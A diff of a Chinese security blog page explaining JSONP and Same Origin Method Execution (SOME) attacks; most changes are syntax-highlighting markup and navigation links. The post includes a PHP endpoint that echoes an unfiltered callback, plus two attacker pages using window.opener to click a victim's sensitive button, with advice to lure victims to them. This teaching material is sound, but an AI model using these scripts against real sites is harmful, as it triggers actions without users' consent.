@@ -353,16 +353,16 @@
 </blockquote>
 <p>JSONP的实现过程中会存在一个客户端与服务端，<br>客户端包含对数据进行处理的函数，并且使用script标签向服务端请求它要处理的数据。<br>假如我们的请求办法是<code>&lt;script type=&quot;text/javascript&quot; src=&quot;yemian/server.php?callback=&quot;&gt;</code>,其中callback的值即就是处理数据的函数名，<br>然后服务端server.php接受到函数名之后，会对其添加相应的数据并返回给客户端，比如函数名是callback，然后返回给客户端callback({‘xiaoming’,123})，相当于给json数据添加了前缀和后缀，所以称为json with padding。</p>
 <h2 id="0x02-利用："><a href="#0x02-利用：" class="headerlink" title="0x02:利用："></a>0x02:利用：</h2><p>有时候一个参数会过滤导致xss的关键字符，只留下\w+., 这时我们便可以考虑这个参数会不会是被执行的回调函数。假设在主页面<code>www.test.com</code>上存在一个1.html</p>
-<p> 代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">&lt;button onclick=&quot;secret()&quot; &gt;private operation&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	function secret() &#123;</span><br><span class="line">		alert(&apos;secret&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p> 代码如下<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"secret()"</span> &gt;</span>private operation<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	<span class="function"><span class="keyword">function</span> <span class="title">secret</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">		alert(<span class="string">'secret'</span>);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>服务端存在一个执行回调函数的部分来完成相应的功能jsonp.php</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$callback = $_GET[&apos;callback&apos;];</span><br><span class="line">echo &quot;&lt;script&gt;&quot;.$callback.&quot;()&lt;/script&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$callback = $_GET[<span class="string">'callback'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;script&gt;"</span>.$callback.<span class="string">"()&lt;/script&gt;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
 <p>这时我们可以在vps构造两个攻击脚本</p>
 <ol>
 <li>some1.html，使漏洞页面的父窗口为存在敏感操作的页面</li>
 <li>some2.html的作用即是使用window.opener操作父窗口</li>
 </ol>
-<p>some1.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	window.open(&apos;some2.html&apos;);</span><br><span class="line">	location.replace(&apos;http://www.test.com/1.html&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>some2.html<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	location.replace(&apos;http://www.test.com/jsonp.php?callback=window.opener.body.firstElementChild.firstElementChild.click&apos;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>some1.html<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">	<span class="built_in">window</span>.open(<span class="string">'some2.html'</span>);</span></span><br><span class="line"><span class="actionscript">	location.replace(<span class="string">'http://www.test.com/1.html'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>some2.html<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">	location.replace(<span class="string">'http://www.test.com/jsonp.php?callback=window.opener.body.firstElementChild.firstElementChild.click'</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p>然后我们诱骗别人点开vps/some1.html， 即可在他不知情的情况下执行敏感操作。</p>
 <ul>
 <li>一个some 漏洞平台 <a href="https://www.someattack.com/Playground/" target="_blank" rel="noopener">https://www.someattack.com/Playground/</a></li>
@@ -408,8 +408,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/16/2017-05-16-mysql下基于字符集的注入/" rel="next" title="mysql下基于字符集的注入">
-                <i class="fa fa-chevron-left"></i> mysql下基于字符集的注入
+              <a href="/2017/05/16/2017-10-20-一道反序列化ctf/" rel="next" title="一道反序列化ctf">
+                <i class="fa fa-chevron-left"></i> 一道反序列化ctf
               </a>
             
           </div>
@@ -417,6 +417,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/30/2018-11-30-babycake分析/" rel="prev" title="babycake分析">
+                babycake分析 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -493,7 +497,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -515,7 +519,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
